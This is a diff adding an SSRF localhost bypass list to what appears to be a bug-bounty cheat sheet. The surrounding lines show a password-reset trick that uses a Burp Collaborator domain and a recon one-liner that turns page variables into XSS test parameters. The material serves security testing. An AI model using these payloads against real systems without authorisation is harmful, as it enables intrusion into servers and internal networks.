@@ -127,6 +127,19 @@ reset userpassword: user@email.com.burpcolaborator.com
 ```
 assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
 ```
+
+# SSRF Bypass list for localhost (127.0.0.1):
+```
+http://127.1/
+http://0000::1:80/
+http://[::]:80/
+http://2130706433/
+http://whitelisted@127.0.0.1
+http://0x7f000001/
+http://017700000001
+http://0177.00.00.01
+```
+
 # Top 25 SSRF parameters
 ```
 ?dest={target}
